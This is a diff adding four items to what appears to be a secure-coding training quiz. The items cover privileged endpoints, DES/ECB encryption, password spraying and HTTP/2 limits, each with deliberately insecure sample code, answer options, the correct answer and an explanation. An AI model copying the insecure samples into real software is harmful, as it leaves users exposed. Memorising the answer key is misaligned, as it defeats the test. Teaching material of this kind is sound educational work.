+        language: 'generic',
+        options: [
+            {
+                id: '61a',
+                code: `// Enforce strong authentication on the endpoint, even if it's "internal".`
+            },
+            {
+                id: '61b',
+                code: `// Use network-level controls (firewall rules, security groups, VPCs) to ensure the endpoint is only accessible from trusted internal IP ranges.`
+            },
+            {
+                id: '61c',
+                code: 'Both A and B are essential. Defense-in-depth requires both strong authentication and strict network controls for privileged endpoints.'
+            },
+        ],
+        correctOptionId: '61c',
+        explanation: 'Protecting privileged endpoints requires multiple layers. The network configuration should make it impossible for the public to even connect to the endpoint (B). Additionally, the endpoint itself should still require strong authentication in case the network controls ever fail (A).',
+    },
+    {
+        id: '62',
+        title: 'Insecure Cryptographic Practices (Weak Keys)',
+        category: 'Crypto',
+        difficulty: 'Advanced',
+        xp: 85,
+        description: 'The application uses a weak or compromised cryptographic algorithm, or uses a strong algorithm incorrectly.',
+        vulnerableCode: `// Java
+// Using DES, an outdated and insecure encryption standard.
+Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");`,
+        language: 'java',
+        options: [
+            {
+                id: '62a',
+                code: `// Use a modern, strong, and widely-accepted algorithm like AES in a secure mode like GCM.
+Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");`
+            },
+            {
+                id: '62b',
+                code: `// Use a longer key with DES.`
+            },
+            {
+                id: '62c',
+                code: `// Encrypt the data twice with DES for more security.`
+            },
+        ],
+        correctOptionId: '62a',
+        explanation: 'Do not roll your own crypto. Use modern, industry-standard algorithms and modes that are recommended by cryptographic experts. For symmetric encryption, AES-256 in GCM mode is a strong, standard choice.',
+    },
+    {
+        id: '63',
+        title: 'Password Spraying / Brute Force Resilience',
+        category: 'Auth',
+        difficulty: 'Intermediate',
+        xp: 60,
+        description: 'The login endpoint does not have any mechanism to detect or block password spraying attacks (trying a few common passwords against many user accounts).',
+        vulnerableCode: `// A standard login endpoint with no account lockout or rate limiting.
+app.post('/login', (req, res) => {
+  // ... checks username and password
+});`,
+        language: 'javascript',
+        options: [
+            {
+                id: '63a',
+                code: `// Implement account lockout after a certain number of failed login attempts for a single user.`
+            },
+            {
+                id: '63b',
+                code: `// Implement IP-based rate limiting on the login endpoint.`
+            },
+            {
+                id: '63c',
+                code: `// Both A and B are needed. Account lockout stops brute-force on one account, while IP-based limiting helps slow down spraying across many accounts.`
+            },
+        ],
+        correctOptionId: '63c',
+        explanation: 'Defending against various brute-force attacks requires multiple strategies. Account lockout (A) prevents an attacker from targeting a single known account. IP-based rate limiting (B) makes it harder for a single attacker to "spray" a common password against your entire user list.',
+    },
+    {
+        id: '64',
+        title: 'Insecure Use of HTTP/2 or Protocol Misconfig',
+        category: 'Protocol',
+        difficulty: 'Advanced',
+        xp: 75,
+        description: 'An HTTP/2 server is vulnerable to a DoS attack where a client sends a stream of HEADERS frames without data, consuming server resources.',
+        vulnerableCode: `// This is a server configuration vulnerability, not application code.
+// E.g., an Nginx server with a low 'http2_max_concurrent_streams' limit but no limit on header processing.`,
+        language: 'generic',
+        options: [
+            {
+                id: '64a',
+                code: `// Keep the web server software (e.g., Nginx, Apache) and its HTTP/2 module updated to the latest version.`
+            },
+            {
+                id: '64b',
+                code: `// Configure server-side limits on the number of concurrent streams, requests per connection, and the size of the header compression table.`
+            },
+            {
+                id: '64c',
+                code: `Both A and B are essential. Keeping the server patched (A) fixes known vulnerabilities, and proper configuration (B) hardens it against protocol-level abuse.`
+            },
+        ],
+        correctOptionId: '64c',
+        explanation: 'Protocol-level attacks are complex. The primary defenses are to use up-to-date server software that has patched known vulnerabilities (A) and to apply strict, sensible limits in your server configuration to prevent resource exhaustion (B).',
     }
 ];
+
+    
